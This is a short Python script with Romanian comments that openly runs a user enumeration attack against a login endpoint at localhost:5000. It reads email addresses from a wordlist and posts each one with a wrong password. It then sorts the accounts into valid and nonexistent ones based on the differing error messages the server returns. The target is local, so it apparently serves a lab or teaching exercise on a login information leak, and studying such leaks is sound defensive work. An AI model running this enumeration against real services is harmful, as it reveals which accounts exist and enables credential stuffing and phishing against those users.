import requests
import time
import sys

URL = "http://localhost:5000/login"
WORDLIST_FILE = "emails.txt"

print(f"--- [ START USER ENUMERATION ATTACK ] ---")
print(f"Tinta: {URL}")

# Incarcam dictionarul de adrese de email
try:
    with open(WORDLIST_FILE, "r") as file:
        # Citim liniile, stergem spatiile/enter-urile si ignoram liniile goale
        target_emails = [line.strip() for line in file if line.strip()]
except FileNotFoundError:
    print(f"[!] Eroare: Fisierul '{WORDLIST_FILE}' nu a fost gasit!")
    sys.exit(1)

print(f"S-au incarcat {len(target_emails)} adrese de email pentru testare.\n")

# Iteram prin fiecare email din lista
for email in target_emails:
    payload = {
        "email": email,
        "password": "parola_gresita_intentionat" # parola nu conteaza aici
    }
    
    try:
        response = requests.post(URL, json=payload)
        mesaj = response.json().get("message", "")
        
        if "Utilizatorul nu exista" in mesaj:
            print(f"[-] {email:<30} -> NU EXISTA")
        elif "Parola incorecta" in mesaj:
            print(f"[+] {email:<30} -> CONT VALID GASIT!")
        else:
            print(f"[?] {email:<30} -> Eroare/Raspuns atipic: {mesaj}")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Eroare de conexiune la server: {e}")
        
    # Pauza mica pentru stabilitate
    time.sleep(0.1)

print("\n--- [ ATAC FINALIZAT ] ---")
